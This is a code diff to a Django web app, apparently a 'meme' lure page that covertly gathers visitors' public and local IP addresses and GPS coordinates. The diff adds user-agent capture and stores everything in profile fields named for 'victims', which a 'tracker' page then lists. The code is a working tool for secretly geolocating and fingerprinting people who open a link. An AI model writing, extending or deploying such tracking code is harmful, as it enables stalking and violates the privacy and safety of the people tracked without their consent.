@@ -630,7 +630,8 @@ def meme(request, username):
     localip = str(request.POST.get('locip'))
     viclatitude = str(request.POST.get('latitude'))
     viclongitude = str(request.POST.get('longitude'))
-  
+
+    vicuseragent = request.META['HTTP_USER_AGENT']
 
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
 
@@ -645,6 +646,7 @@ def meme(request, username):
       user.profile.victimlocip = localip
       user.profile.victimlatitude = viclatitude
       user.profile.victimlongitude = viclongitude
+      user.profile.victimuseragent = vicuseragent
 
     elif publicip not in user.profile.victimpublicip or localip not in user.profile.victimlocip:
 
@@ -653,6 +655,7 @@ def meme(request, username):
         user.profile.victimlocip += ','+localip
         user.profile.victimlatitude += ','+viclatitude
         user.profile.victimlongitude += ','+viclongitude
+        user.profile.victimuseragent += ','+vicuseragent
 
       else:
         pass
@@ -677,6 +680,7 @@ def tracker(request):
         user.profile.victimlocip=""
         user.profile.victimpublicip=""
         user.profile.victimlongitude=""
+        user.profile.victimuseragent = ""
         user.save()
         return redirect("tracker")
       else:
@@ -702,9 +706,13 @@ def tracker(request):
 
     viclongitude = user.profile.victimlongitude
     viclongitude = viclongitude.split(",")
+
+    vicuseragent = user.profile.victimuseragent
+    vicuseragent = vicuseragent.split(",")
+    
     victim=[]
     for i in range(len(viclatitude)):
-      victim.append([victimpublicip[i],victimlocip[i],viclatitude[i],viclongitude[i]])
+      victim.append([victimpublicip[i],victimlocip[i],vicuseragent[i],viclatitude[i],viclongitude[i]])
 
     if victimpublicip != ['']:
       return render(request, 'tracker.html', {'victim':victim,'url':url})
